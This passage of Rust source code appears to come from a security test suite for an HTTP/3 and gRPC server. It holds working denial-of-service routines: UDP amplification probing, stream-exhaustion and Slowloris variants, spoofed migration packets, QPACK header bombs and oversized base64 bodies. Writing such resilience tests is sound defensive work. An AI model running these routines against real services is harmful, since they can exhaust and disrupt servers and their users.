    let mut total_sent = 0u64;
    let mut total_recv = 0u64;
    let mut sockets = Vec::new();

    // 16 ソースポートから同時に Initial 風パケットを送る
    for _ in 0..16 {
        let socket = UdpSocket::bind("0.0.0.0:0")?;
        socket.set_read_timeout(Some(Duration::from_millis(200)))?;
        socket.set_write_timeout(Some(Duration::from_secs(2)))?;
        socket.connect(peer)?;
        sockets.push(socket);
    }

    let mut pkt = vec![0u8; 1200];
    pkt[0] = 0xc0;
    pkt[1..5].copy_from_slice(&1u32.to_be_bytes());
    pkt[5] = 8;
    pkt[14] = 0;

    for round in 0..8 {
        for (si, socket) in sockets.iter().enumerate() {
            getrandom::getrandom(&mut pkt[6..14]).ok();
            pkt[15] = ((round * 16 + si) & 0xff) as u8;
            getrandom::getrandom(&mut pkt[16..]).ok();
            if let Ok(n) = socket.send(&pkt) {
                total_sent += n as u64;
            }
        }
    }

    // 応答を収集（増幅比測定）
    let start = Instant::now();
    let mut buf = [0u8; 65535];
    while start.elapsed() < Duration::from_secs(3) {
        for socket in &sockets {
            match socket.recv(&mut buf) {
                Ok(n) => total_recv += n as u64,
                Err(_) => {}
            }
        }
    }

    let ratio = if total_sent == 0 {
        0.0
    } else {
        total_recv as f64 / total_sent as f64
    };
    let strict = env::var("AMPLIFICATION_STRICT")
        .map(|v| v != "0" && v != "false")
        .unwrap_or(true);
    let detail = format!(
        "sent={} recv={} ratio={:.3} sockets={}",
        total_sent,
        total_recv,
        ratio,
        sockets.len()
    );
    if strict && ratio > 3.0 && total_sent > 0 {
        return Err(format!("AMPLIFICATION_EXCEEDED {}", detail).into());
    }
    Ok(detail)
}

/// F-96: データ無し/最小ストリームを MAX_STREAMS 付近まで大量オープン（QUIC Slowloris）。
fn max_streams_attack(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let mut opened = 0usize;
    let mut refused = 0usize;
    // 既定 initial_max_streams_bidi=100 を超える試行
    for i in 0..150 {
        let headers = vec![
            quiche::h3::Header::new(b":method", b"GET"),
            quiche::h3::Header::new(b":path", path.as_bytes()),
            quiche::h3::Header::new(b":authority", host.as_bytes()),
            quiche::h3::Header::new(b":scheme", b"https"),
            quiche::h3::Header::new(b"x-stream-idx", format!("{}", i).as_bytes()),
        ];
        // fin=false でストリームを開いたまま維持
        match session.h3.send_request(&mut session.conn, &headers, false) {
            Ok(_sid) => opened += 1,
            Err(_) => {
                refused += 1;
                break;
            }
        }
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            break;
        }
    }
    // 少し保持してから解放（生存確認はプローブ側）
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(2) {
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            break;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    Ok(format!(
        "opened={} refused={} closed={}",
        opened,
        refused,
        session.conn.is_closed()
    ))
}

/// F-96: 正規ハンドシェイク後に別ソースポートから同一 DCID 風パケットを送り
/// connection migration spoof を刺激する。
fn migration_spoof(host: &str, port: u16) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 15_000)?;
    // 正規トラフィックを 1 リクエスト送る
    let headers = vec![
        quiche::h3::Header::new(b":method", b"GET"),
        quiche::h3::Header::new(b":path", b"/"),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
    ];
    let _ = session.h3.send_request(&mut session.conn, &headers, true);
    pump_io(&mut session);
    let _ = drain_events(&mut session);

    // サーバが観測した DCID はクライアント SCID とは別。short-header 風の偽パケットを
    // 別ソケット（別 4-tuple）から大量送信してマイグレーション検証を刺激する。
    let peer = session.peer_addr;
    let mut spoof_sent = 0usize;
    for _ in 0..5 {
        let sock = UdpSocket::bind("0.0.0.0:0")?;
        sock.set_write_timeout(Some(Duration::from_secs(1)))?;
        sock.connect(peer)?;
        let mut pkt = [0u8; 120];
        for _ in 0..40 {
            pkt[0] = 0x40; // short header
            getrandom::getrandom(&mut pkt[1..]).ok();
            if sock.send(&pkt).is_ok() {
                spoof_sent += 1;
            }
        }
    }

    // 正規接続が生存しているか（または安全に閉じたか）を確認
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(2) {
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        std::thread::sleep(Duration::from_millis(50));
    }
    Ok(format!(
        "spoof_sent={} conn_closed={}",
        spoof_sent,
        session.conn.is_closed()
    ))
}

/// F-96: QPACK 動的テーブル非同期参照の近似 — 巨大・多数ヘッダを複数ストリームで
/// ほぼ同時に送り、エンコーダ/デコーダ状態の破壊耐性を検証する。
fn qpack_async_ref(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 20_000)?;
    let big = "Q".repeat(2048);
    let mut opened = 0usize;
    for i in 0..12 {
        let mut headers = vec![
            quiche::h3::Header::new(b":method", b"GET"),
            quiche::h3::Header::new(b":path", path.as_bytes()),
            quiche::h3::Header::new(b":authority", host.as_bytes()),
            quiche::h3::Header::new(b":scheme", b"https"),
        ];
        // 同一名の巨大ヘッダを繰り返し（動的テーブル挿入 + 参照を誘発）
        for j in 0..8 {
            let name = format!("x-qpack-{}-{}", i, j % 3);
            headers.push(quiche::h3::Header::new(name.as_bytes(), big.as_bytes()));
        }
        match session.h3.send_request(&mut session.conn, &headers, true) {
            Ok(_) => opened += 1,
            Err(e) => {
                return Ok(format!("stopped early err={} opened={}", e, opened));
            }
        }
        // 意図的に pump を遅らせて順序逆転風の負荷を作る
        if i % 3 == 0 {
            pump_io(&mut session);
            let _ = drain_events(&mut session);
        }
    }
    let start = Instant::now();
    let mut last_status = None;
    while start.elapsed() < Duration::from_secs(5) {
        pump_io(&mut session);
        let (st, fin) = drain_events(&mut session);
        if st.is_some() {
            last_status = st;
        }
        if session.conn.is_closed() || fin {
            break;
        }
    }
    Ok(format!(
        "opened={} status={:?} closed={}",
        opened,
        last_status,
        session.conn.is_closed()
    ))
}

/// F-97: :authority=正常 SNI host、Host=evil.example の不一致を送り 400 を期待
fn authority_host_mismatch(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 15_000)?;
    let headers = vec![
        quiche::h3::Header::new(b":method", b"GET"),
        quiche::h3::Header::new(b":path", path.as_bytes()),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
        quiche::h3::Header::new(b"host", b"evil.example"),
    ];
    let stream_id = session
        .h3
        .send_request(&mut session.conn, &headers, true)?;
    pump_io(&mut session);
    let start = Instant::now();
    let mut status: Option<u16> = None;
    while start.elapsed() < Duration::from_secs(8) {
        pump_io(&mut session);
        let (st, fin) = drain_events(&mut session);
        if st.is_some() {
            status = st;
        }
        if fin || session.conn.is_closed() {
            break;
        }
        let _ = stream_id;
    }
    match status {
        Some(400) => Ok(format!("status=400 (expected)")),
        Some(s) => Err(format!("expected 400 for authority/Host mismatch, got {}", s).into()),
        None => Err("no status for authority/Host mismatch".into()),
    }
}

/// F-97 S-H3-14: 接続確立後にストリームボディを 1 バイトずつ極遅送信（Stream Body Slowloris）
fn stream_body_slowloris(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let headers = vec![
        quiche::h3::Header::new(b":method", b"POST"),
        quiche::h3::Header::new(b":path", path.as_bytes()),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
        quiche::h3::Header::new(b"content-type", b"application/octet-stream"),
        // 大きめ CL を宣言しボディを極遅で送る
        quiche::h3::Header::new(b"content-length", b"64"),
    ];
    let stream_id = session
        .h3
        .send_request(&mut session.conn, &headers, false)?;
    pump_io(&mut session);

    let payload = b"SLOWLORIS-BODY-BYTES-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
    let mut sent = 0usize;
    for &byte in payload.iter().take(64) {
        match session
            .h3
            .send_body(&mut session.conn, stream_id, &[byte], sent + 1 >= 64)
        {
            Ok(n) => sent += n,
            Err(e) => {
                return Ok(format!("stopped early sent={} err={}", sent, e));
            }
        }
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        std::thread::sleep(Duration::from_millis(80));
        if session.conn.is_closed() {
            break;
        }
    }
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(3) {
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            break;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    Ok(format!(
        "sent={} closed={}",
        sent,
        session.conn.is_closed()
    ))
}

/// F-99: gRPC over HTTP/3 経路への QPACK 動的テーブル・巨大ヘッダ連打
fn grpc_qpack_bomb(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let big = "Q".repeat(2048);
    let mut opened = 0usize;
    let mut stopped_err = None;
    for i in 0..30 {
        let mut headers = grpc_base_headers(host, path);
        for j in 0..12 {
            let name = format!("x-h3-grpc-qpack-{}-{}", i, j);
            headers.push(quiche::h3::Header::new(name.as_bytes(), big.as_bytes()));
        }
        // 最小 LPM
        let body = [0u8, 0, 0, 0, 2, b'{', b'}'];
        match session.h3.send_request(&mut session.conn, &headers, false) {
            Ok(sid) => {
                opened += 1;
                let _ = session
                    .h3
                    .send_body(&mut session.conn, sid, &body, true);
            }
            Err(e) => {
                stopped_err = Some(format!("{}", e));
                break;
            }
        }
        if i % 3 == 0 {
            pump_io(&mut session);
            let _ = drain_events(&mut session);
        }
        if session.conn.is_closed() {
            break;
        }
    }
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(4) {
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            break;
        }
    }
    Ok(format!(
        "opened={} err={:?} closed={}",
        opened,
        stopped_err,
        session.conn.is_closed()
    ))
}

/// F-99: gRPC over HTTP/3 で MAX_CONCURRENT_STREAMS 超バースト
fn grpc_max_streams(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let body = [0u8, 0, 0, 0, 2, b'{', b'}'];
    let mut opened = 0usize;
    let mut stopped_err = None;
    for _ in 0..80 {
        let headers = grpc_base_headers(host, path);
        match session.h3.send_request(&mut session.conn, &headers, false) {
            Ok(sid) => {
                opened += 1;
                let _ = session
                    .h3
                    .send_body(&mut session.conn, sid, &body, true);
            }
            Err(e) => {
                stopped_err = Some(format!("{}", e));
                break;
            }
        }
        if opened % 8 == 0 {
            pump_io(&mut session);
            let _ = drain_events(&mut session);
        }
        if session.conn.is_closed() {
            break;
        }
    }
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(5) {
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            break;
        }
    }
    Ok(format!(
        "opened={} err={:?} closed={}",
        opened,
        stopped_err,
        session.conn.is_closed()
    ))
}

/// F-99: ヘッダ完了後ボディを送らず長時間保持（half-closed hold）
fn grpc_half_closed(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let headers = grpc_base_headers(host, path);
    // fin=false でヘッダのみ送信
    let stream_id = session
        .h3
        .send_request(&mut session.conn, &headers, false)?;
    pump_io(&mut session);
    let _ = drain_events(&mut session);

    // ボディを送らず ~8 秒保持
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(8) {
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            return Ok(format!(
                "conn_closed early stream_id={} held_ms={}",
                stream_id,
                start.elapsed().as_millis()
            ));
        }
        std::thread::sleep(Duration::from_millis(100));
    }
    // 最後に部分ボディ + fin
    let partial = [0u8, 0, 0, 0, 16];
    let _ = session
        .h3
        .send_body(&mut session.conn, stream_id, &partial, true);
    pump_io(&mut session);
    let _ = drain_events(&mut session);
    Ok(format!(
        "held_ms={} stream_id={} closed={}",
        start.elapsed().as_millis(),
        stream_id,
        session.conn.is_closed()
    ))
}

/// F-99: 不正タイミングの trailer 風ヘッダ（初期 HEADERS に grpc-status を混ぜる）
fn grpc_malicious_trailers(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 15_000)?;
    let mut headers = grpc_base_headers(host, path);
    // リクエスト HEADERS にレスポンス用 trailer を混入
    headers.push(quiche::h3::Header::new(b"grpc-status", b"0"));
    headers.push(quiche::h3::Header::new(b"grpc-message", b"premature-trailer"));
    headers.push(quiche::h3::Header::new(b"trailer", b"grpc-status,grpc-message"));

    // 不完全 LPM（length 宣言と不一致）
    let body = [0u8, 0, 0, 0, 0x20, b'P', b'A', b'R', b'T'];
    let stream_id = session.h3.send_request(&mut session.conn, &headers, false)?;
    session
        .h3
        .send_body(&mut session.conn, stream_id, &body, true)?;
    pump_io(&mut session);

    let start = Instant::now();
    let mut last_status = None;
    while start.elapsed() < Duration::from_secs(8) {
        pump_io(&mut session);
        let (st, fin) = drain_events(&mut session);
        if st.is_some() {
            last_status = st;
        }
        if fin || session.conn.is_closed() {
            break;
        }
    }
    Ok(format!("status={:?} closed={}", last_status, session.conn.is_closed()))
}

/// F-99: gRPC-Web over HTTP/3 不正ボディ（5 バイト未満）
fn grpc_web_malformed(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 15_000)?;
    let headers = vec![
        quiche::h3::Header::new(b":method", b"POST"),
        quiche::h3::Header::new(b":path", path.as_bytes()),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
        quiche::h3::Header::new(b"content-type", b"application/grpc-web"),
        quiche::h3::Header::new(b"accept", b"application/grpc-web"),
    ];
    let body = b"bad";
    let stream_id = session.h3.send_request(&mut session.conn, &headers, false)?;
    session
        .h3
        .send_body(&mut session.conn, stream_id, body, true)?;
    pump_io(&mut session);

    let start = Instant::now();
    let mut last_status = None;
    while start.elapsed() < Duration::from_secs(8) {
        pump_io(&mut session);
        let (st, fin) = drain_events(&mut session);
        if st.is_some() {
            last_status = st;
        }
        if fin || session.conn.is_closed() {
            break;
        }
    }
    Ok(format!("status={:?}", last_status))
}

/// F-99: gRPC-Web-Text over HTTP/3 巨大 Base64 DOS
fn grpc_web_large_b64(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let headers = vec![
        quiche::h3::Header::new(b":method", b"POST"),
        quiche::h3::Header::new(b":path", path.as_bytes()),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
        quiche::h3::Header::new(b"content-type", b"application/grpc-web-text"),
        quiche::h3::Header::new(b"accept", b"application/grpc-web-text"),
    ];
    // ~200KB の 'A' を base64 風（有効 alphabet）で送る
    let raw = vec![b'A'; 200 * 1024];
    // 簡易 base64（std 無しの環境でも動くよう手動エンコード相当: そのまま 'A' 連打でも
    // デコーダを刺激する。正式 base64 に近い長さを確保）
    let b64: String = {
        // 標準 base64 アルファベットで埋める
        const ALPH: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::with_capacity(raw.len() * 4 / 3 + 4);
        for chunk in raw.chunks(3) {
            let b0 = chunk[0] as u32;
            let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
            let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
            let n = (b0 << 16) | (b1 << 8) | b2;
            out.push(ALPH[((n >> 18) & 63) as usize] as char);
            out.push(ALPH[((n >> 12) & 63) as usize] as char);
            if chunk.len() > 1 {
                out.push(ALPH[((n >> 6) & 63) as usize] as char);
            } else {
                out.push('=');
            }
            if chunk.len() > 2 {
                out.push(ALPH[(n & 63) as usize] as char);
            } else {
                out.push('=');
            }
        }
        out
    };

    let stream_id = session.h3.send_request(&mut session.conn, &headers, false)?;
    // 大きめボディをチャンク送信
    let bytes = b64.as_bytes();
    let mut sent = 0usize;
    const CHUNK: usize = 16 * 1024;
    while sent < bytes.len() {
        let end = (sent + CHUNK).min(bytes.len());
        let fin = end >= bytes.len();
        match session
            .h3
            .send_body(&mut session.conn, stream_id, &bytes[sent..end], fin)
        {
            Ok(n) => sent += n,
            Err(e) => {
                return Ok(format!("send_stopped sent={} err={}", sent, e));
            }
        }
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            break;
        }
    }

    let start = Instant::now();
    let mut last_status = None;
    while start.elapsed() < Duration::from_secs(10) {
        pump_io(&mut session);
        let (st, fin) = drain_events(&mut session);
        if st.is_some() {
            last_status = st;
        }
        if fin || session.conn.is_closed() {
            break;
        }
    }
    Ok(format!(
        "sent={} status={:?} closed={}",
        sent,
        last_status,
        session.conn.is_closed()
    ))
}

/// F-97 S-H3-15: 巨大・ユニークなヘッダを大量送信し QPACK 動的テーブル枯渇を誘発
fn qpack_memory_exhaustion(
    host: &str,
    port: u16,
    path: &str,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let big = "M".repeat(1024);
    let mut opened = 0usize;
    let mut stopped_err = None;
    for i in 0..40 {
        let mut headers = vec![
            quiche::h3::Header::new(b":method", b"GET"),
            quiche::h3::Header::new(b":path", path.as_bytes()),
            quiche::h3::Header::new(b":authority", host.as_bytes()),
            quiche::h3::Header::new(b":scheme", b"https"),
        ];
        // すべてユニークなヘッダ名で動的テーブル挿入を強制
        for j in 0..16 {
            let name = format!("x-qpack-mem-{}-{}", i, j);
            headers.push(quiche::h3::Header::new(name.as_bytes(), big.as_bytes()));
        }
        match session.h3.send_request(&mut session.conn, &headers, true) {
            Ok(_) => opened += 1,
            Err(e) => {
                stopped_err = Some(format!("{}", e));
                break;
            }
        }
        if i % 4 == 0 {
            pump_io(&mut session);
            let _ = drain_events(&mut session);
        }
        if session.conn.is_closed() {
            break;
        }
    }
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(4) {
        pump_io(&mut session);
        let _ = drain_events(&mut session);
        if session.conn.is_closed() {
            break;
        }
    }
    Ok(format!(
        "opened={} err={:?} closed={}",
        opened,
        stopped_err,
        session.conn.is_closed()
    ))
}

fn send_http3_get(host: &str, port: u16, path: &str) -> Result<usize, Box<dyn std::error::Error>> {
    let mut session = establish_h3(host, port, 30_000)?;
    let headers = vec![
        quiche::h3::Header::new(b":method", b"GET"),
        quiche::h3::Header::new(b":path", path.as_bytes()),
        quiche::h3::Header::new(b":authority", host.as_bytes()),
        quiche::h3::Header::new(b":scheme", b"https"),
    ];

    let stream_id = session.h3.send_request(&mut session.conn, &headers, true)?;
    pump_io(&mut session);

    let mut response_size = 0usize;
    let mut status: Option<u16> = None;
    let start = Instant::now();
    let timeout = Duration::from_secs(15);

    while start.elapsed() < timeout {
        match session.socket.recv(&mut session.buf) {
            Ok(len) => {
                let recv_info = quiche::RecvInfo {
                    from: session.peer_addr,
                    to: session.socket.local_addr()?,
                };
                session.conn.recv(&mut session.buf[..len], recv_info)?;
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                if session.conn.is_closed() {
                    break;
                }
            }
            Err(e) => return Err(Box::new(e)),
        }

        loop {
            match session.h3.poll(&mut session.conn) {
                Ok((id, quiche::h3::Event::Headers { list, .. })) if id == stream_id => {
                    for h in &list {
                        if h.name() == b":status" {
                            status = std::str::from_utf8(h.value())
                                .ok()
                                .and_then(|s| s.parse().ok());
                        }
                        response_size += h.name().len() + h.value().len();
                    }
                }
                Ok((id, quiche::h3::Event::Data)) if id == stream_id => {
                    while let Ok(read) =
                        session.h3.recv_body(&mut session.conn, id, &mut session.buf)
                    {
                        response_size += read;
                    }
                    if matches!(status, Some(200) | Some(301) | Some(302)) && response_size > 0 {
                        return Ok(response_size);
                    }
                }
                Ok((id, quiche::h3::Event::Finished)) if id == stream_id => match status {
                    Some(200) | Some(301) | Some(302) => return Ok(response_size),
                    Some(code) => return Err(format!("unexpected status {}", code).into()),
                    None => return Err("no :status header".into()),
                },
                Ok(_) => {}
                Err(quiche::h3::Error::Done) => break,
                Err(e) => return Err(Box::new(e)),
            }
        }

        while let Ok((write, _)) = session.conn.send(&mut session.out) {
            session.socket.send(&session.out[..write])?;
        }
        if session.conn.is_closed() {
            break;
        }
    }

    Err("HTTP/3 response timeout".into())
}
